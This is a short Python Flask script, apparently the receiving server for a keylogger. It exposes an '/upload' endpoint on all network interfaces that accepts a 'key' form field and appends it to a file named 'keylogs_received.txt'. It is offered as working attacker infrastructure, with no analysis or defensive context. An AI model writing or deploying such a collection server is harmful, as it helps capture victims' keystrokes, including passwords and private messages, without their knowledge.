from flask import Flask, request
app = Flask(__name__)
@app.route('/upload', methods=['POST'])
def upload_keylog():
    key_data = request.form['key']
    with open("keylogs_received.txt", "a") as f:
        f.write(key_data + "\n")
    return 'Received', 200
if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)  # Change port as needed
